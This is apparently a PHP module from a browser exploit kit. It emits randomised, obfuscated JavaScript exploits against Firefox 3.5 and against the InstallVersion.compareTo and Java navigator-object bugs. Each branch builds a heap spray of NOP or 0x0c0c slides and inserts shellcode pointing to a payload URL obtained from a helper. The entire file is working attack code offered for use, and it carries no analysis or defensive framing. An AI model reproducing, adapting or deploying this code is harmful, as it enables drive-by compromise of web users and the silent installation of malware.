<?php


$randVar = $GLOBALS['cpFunctions']->CreateArrayString( rand( 10, 30 ), '100' );

if ($browser == 'ff') {
	if ($version == '3.5') {
		$strUrl = $GLOBALS['cpXplHelper']->GetURL( 'other', $browser, $os, 'retval' );
		$functionName = $ExploitFunctions[12];
		$replaceFunction = $GLOBALS['cpFunctions']->RandAlpha( 2 );
		$eArray[] = '
		var ' . $randVar[4] . ' = new Array();
		function ' . $randVar[5] . '(' . $randVar[6] . ')
		{
		 var i;
		 var c;
		 var ' . $randVar[7] . '="";
		 for(i=0;i<' . $randVar[6] . '.length;i++)
		  {
		   c=' . $randVar[6] . '.charAt(i);
		   if(c=="&" || c=="?" || c=="=" || c=="%" || c==" ") c = escape(c);
		   ' . $randVar[7] . '+=c;
		  }
		 return ' . $randVar[7] . ';
		}

		function ' . $randVar[8] . '(){
			' . $randVar[4] . ' = new Array();
			' . $randVar[4] . '[0] = new Array();
			' . $randVar[4] . '[0]["str"] = "blah";
			var ' . $randVar[10] . ' = document.getElementById("' . $randVar[12] . '")
			if (document.getElementsByTagName) {
				var i=0;
				' . $randVar[11] . ' = ' . $randVar[10] . '.getElementsByTagName("p")
				if (' . $randVar[11] . '.length > 0)
				while (i<' . $randVar[11] . '.length)
				{
					' . $randVar[13] . ' = ' . $randVar[11] . '[i].getElementsByTagName("font")
					' . $randVar[4] . '[i+1] = new Array()
					if (' . $randVar[13] . '[0])
					{
						' . $randVar[4] . '[i+1]["str"] = ' . $randVar[13] . '[0].innerHTML;
					}
					i++
				}
			}
		}
		function ' . $functionName . '(){
			var obj = document.createElement(\'div\');
			document.body.appendChild(obj);
			obj.id = "' . $randVar[12] . '";
			obj.innerHTML = "<p><FONT></FONT></p><p><FONT>Loremipsumdoloregkuw</FONT></p><p><FONT>Loremipsumdoloregkuwiert</FONT></p><p><FONT>Loremikdkw  </FONT></p>";
			var ' . $randVar[0] . ' = "' . $GLOBALS['cpXplHelper']->GetJSShellcode( $strUrl, $replaceFunction ) . '".replace(/' . $replaceFunction . '/g,"Au".replace(/A/g,"B").replace(/B/g,unescape("%25")));
			var ' . $randVar[1] . ' = unescape(' . $randVar[0] . ');
			var ' . $randVar[2] . ' = unescape("%u0c0c%u0c0c");

			while (' . $randVar[2] . '.length<0x60000)
			{
				' . $randVar[2] . ' += ' . $randVar[2] . ';
			}
			' . $randVar[3] . ' = new Array();
			for (i=0; i<600; i++)
			{
				' . $randVar[3] . '[i] = ' . $randVar[2] . ' + ' . $randVar[1] . ';
			}
			' . $randVar[8] . '();
			var html = "";
			for (i=1;i<' . $randVar[4] . '.length;i++){
				html += ' . $randVar[5] . '(' . $randVar[4] . '[i]["str"])
			}
			{next}
		}';
	}
	else {
		if ($version == '1.1') {
			$strUrl = $GLOBALS['cpXplHelper']->GetURL( 'other', $browser, $os, 'compareTo' );
			$functionName = $ExploitFunctions[9];
			$replaceFunction = $GLOBALS['cpFunctions']->RandAlpha( 2 );
			$eArray[] = '
		function ' . $functionName . '(){
			location.href="javascript:void (new InstallVersion());";
			' . $randVar[1] . '();
			{next}
		};
		function ' . $randVar[1] . '() {
			var ' . $randVar[2] . '= 0x12000000;
			var ' . $randVar[3] . ' = "' . $GLOBALS['cpXplHelper']->GetJSShellcode( $strUrl, $replaceFunction ) . '".replace(/' . $replaceFunction . '/g,"Au".replace(/A/g,"B").replace(/B/g,unescape("%25")));
			var ' . $randVar[4] . ' = unescape(' . $randVar[3] . ');
			var ' . $randVar[5] . '= 0x400000;
			var ' . $randVar[6] . '=' . $randVar[4] . '.length * 2;
			var ' . $randVar[7] . '=' . $randVar[5] . '-(' . $randVar[6] . '+0x38);
			var ' . $randVar[8] . ' = unescape("%u002C%u11C0");
			' . $randVar[8] . ' = ' . $randVar[10] . '(' . $randVar[8] . ',' . $randVar[7] . ');
			var ' . $randVar[9] . ' = unescape("%u002C%u1200");
			' . $randVar[9] . ' = ' . $randVar[10] . '(' . $randVar[9] . ',' . $randVar[7] . ');
			var ' . $randVar[11] . ' = unescape("%u9090%u9090");
			' . $randVar[11] . ' = ' . $randVar[10] . '(' . $randVar[11] . ',' . $randVar[7] . ');
			' . $randVar[12] . '=(' . $randVar[2] . '-0x400000)/' . $randVar[5] . ';
			' . $randVar[13] . ' = new Array();
			for (' . $randVar[14] . '=0;' . $randVar[14] . '<' . $randVar[12] . ';' . $randVar[14] . '++)
			{
			' . $randVar[13] . '[' . $randVar[14] . ']=(' . $randVar[14] . '%3==0) ? ' . $randVar[8] . ' + ' . $randVar[4] . ':
			(' . $randVar[14] . '%3==1) ? ' . $randVar[9] . ' + ' . $randVar[4] . ': ' . $randVar[11] . ' + ' . $randVar[4] . ';
			}
			var ' . $randVar[15] . ' = 0x1180002C;
			(new InstallVersion).compareTo(new Number(' . $randVar[15] . ' >> 1));
		}
		function ' . $randVar[10] . '(' . $randVar[16] . ', ' . $randVar[7] . ') {
			while (' . $randVar[16] . '.length*2<' . $randVar[7] . ')
			{
			' . $randVar[16] . '+=' . $randVar[16] . ';
			}
			' . $randVar[16] . '=' . $randVar[16] . '.substring(0,' . $randVar[7] . '/2);
			return ' . $randVar[16] . ';
		}';
		}
		else {
			if ($version == '1.5') {
				$functionName = $ExploitFunctions[9];
				$replaceFunction = $GLOBALS['cpFunctions']->RandAlpha( 2 );
				$strUrl = $GLOBALS['cpXplHelper']->GetURL( 'other', $browser, $os, 'Java Navigator Object' );
				$eArray[] = '
		function ' . $functionName . '(){
			var ' . $randVar[0] . ' = "' . $GLOBALS['cpXplHelper']->GetJSShellcode( $strUrl, $replaceFunction ) . '".replace(/' . $replaceFunction . '/g,"Au".replace(/A/g,"B").replace(/B/g,unescape("%25")));
			var ' . $randVar[1] . ' = unescape(' . $randVar[0] . ');
			var ' . $randVar[2] . ' = unescape(\'%u0800\');
			var ' . $randVar[3] . ' = 0x08000800;
			var ' . $randVar[4] . ';
			var ' . $randVar[5] . ';
			var ' . $randVar[6] . ';
			var ' . $randVar[7] . ' = \'\' + navigator.userAgent;
			if (' . $randVar[7] . '.indexOf(\'Windows\') != -1)
			{
			' . $randVar[4] . ' = ' . $randVar[1] . ';
			' . $randVar[5] . ' = ' . $randVar[3] . ';
			' . $randVar[6] . ' = ' . $randVar[2] . ';
			}
			var ' . $randVar[8] . ' = ' . $randVar[6] . ';
			while (' . $randVar[8] . '.length <= 0x400000) ' . $randVar[8] . '+=' . $randVar[8] . ';
			var ' . $randVar[9] . ' = new Array();
			for (var ' . $randVar[10] . ' =0; ' . $randVar[10] . '<36; ' . $randVar[10] . '++) {
			' . $randVar[9] . '[' . $randVar[10] . '] =
			' . $randVar[8] . '.substring(0,  0x100000 - ' . $randVar[4] . '.length) + ' . $randVar[4] . ' +
			' . $randVar[8] . '.substring(0,  0x100000 - ' . $randVar[4] . '.length) + ' . $randVar[4] . ' +
			' . $randVar[8] . '.substring(0,  0x100000 - ' . $randVar[4] . '.length) + ' . $randVar[4] . ' +
			' . $randVar[8] . '.substring(0,  0x100000 - ' . $randVar[4] . '.length) + ' . $randVar[4] . ';
			}
			if (window.navigator.javaEnabled) {
				window.navigator = (' . $randVar[5] . ' / 2);
				try {
				java.lang.reflect.Runtime.newInstance(
				java.lang.Class.forName("java.lang.Runtime"), 0
				);
				}catch(e){}
			}
			{next}
		}';
			}
		}
	}
}

echo '			';
?>
